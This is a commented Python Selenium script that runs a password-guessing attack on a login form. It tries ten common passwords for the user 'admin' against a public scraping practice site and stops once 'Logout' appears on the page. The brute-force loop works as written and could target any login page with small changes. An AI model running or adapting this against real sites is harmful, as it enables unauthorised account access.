from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Password List #

# a list of passwords the script will try one by one
password_list = [
    "123456",
    "password",
    "admin",
    "letmein",
    "qwerty",
    "abc123",
    "welcome",
    "monkey",
    "dragon",
    "pass1234"
]


# Attempt Counter #

# this variable keeps track of how login attempts we make
attempt_count = 0


# Starting the browser #

# this launches Google Chrome
driver = webdriver.Chrome()

# wait up to 10 seconds for elements to appear before giving an error
wait = WebDriverWait(driver, 10)

# this opens the login page we want to test
driver.get("https://quotes.toscrape.com/login")


# Main Loop #

# this loop runs once for every password in the list
for password in password_list:

    # increase attempt counter by 1 each time the loop runs
    attempt_count +=1

    # print which attempt number we are on
    print(f"\nAttempt #{attempt_count}")

    # print which password is being tested
    print(f"\nTrying password: {password}")

    # reload the login page each time to reset the form before the next attempt
    driver.get("https://quotes.toscrape.com/login")

    # wait until the username field is present on the page. if it takes too long, Selenium will throw an error
    username_field = wait.until(
        EC.presence_of_element_located((By.NAME, "username"))
    )

    # find the password input box by its "name" attribute
    password_field = driver.find_element(By.NAME, "password")

    # type "admin" into the username field
    username_field.send_keys("admin")

    # type the current password into the password field
    password_field.send_keys(password)

    # press the ENTER key to submit the form
    password_field.send_keys(Keys.RETURN)

    # wait 1 second before continuing. this simulates a human delay and avoids rapid fire requests
    time.sleep(1)


    # Check If Login Was Successful #

    # if the word "Logout" appears in the page source, that means login worked
    if "Logout" in driver.page_source:
        print("\nLogin Successful!")
        break       # Stops the loop if we get in
    else:
        print("\nLogin Failed")


# After Loop Finishes #

# print total number of attempts made
print(f"\nTotal attempts made: {attempt_count}\n")

# close the browser completely
driver.quit()